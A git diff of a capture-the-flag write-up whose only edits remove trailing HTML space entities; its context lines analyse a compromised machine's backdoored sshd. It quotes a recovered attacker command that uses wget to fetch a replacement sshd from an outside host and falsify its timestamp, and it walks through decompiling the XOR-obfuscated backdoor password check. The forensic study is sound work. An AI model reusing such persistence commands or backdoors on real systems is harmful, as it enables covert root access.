@@ -205,7 +205,7 @@ drwxr-xr-x 8 root root  4096 Feb  8  2022 ..
 <TRUNCATED>
 ```
 
-The rest of the files were about 500 bytes, meanwhile this thing was massive. We can bring this back to our machine for analysis via `nc`.&#x20;
+The rest of the files were about 500 bytes, meanwhile this thing was massive. We can bring this back to our machine for analysis via `nc`.
 
 Then, using `ida64`, we see that there are base64 related functions for this:
 
@@ -223,7 +223,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 ```
 {% endcode %}
 
-`sshd` is in use here, so let's download that binary back to our machine since RE seems to be the path forward in this machine.&#x20;
+`sshd` is in use here, so let's download that binary back to our machine since RE seems to be the path forward in this machine.
 
 ### sshd RE -> Root Pwd
 
@@ -231,7 +231,7 @@ This was a much larger binary, so let's use `ghidra` to get some pseudocode. Whe
 
 <figure><img src="../../../.gitbook/assets/image (3115).png" alt=""><figcaption></figcaption></figure>
 
-This might contain the credentials for `root`.&#x20;
+This might contain the credentials for `root`.
 
 ```c
 int auth_password(ssh *ssh,char *password)
@@ -276,7 +276,7 @@ int auth_password(ssh *ssh,char *password)
 <TRUNCATED>
 ```
 
-This takes some bytes and jumbles them up, then it would XOR with `0x96` before comparing with some variable and stop the function. The "some variable" probably refers to an index variable for a `for` loop that iterates over the entire string.&#x20;
+This takes some bytes and jumbles them up, then it would XOR with `0x96` before comparing with some variable and stop the function. The "some variable" probably refers to an index variable for a `for` loop that iterates over the entire string.
 
 From running `lscpu` on the machine, we know this is a little endian machine, and we need to reverse this string.  There are 31 bytes (indicated by `backdoor[30]` being the largest index I can see here) and they are all over the place. Let's first organise the string in order:
 
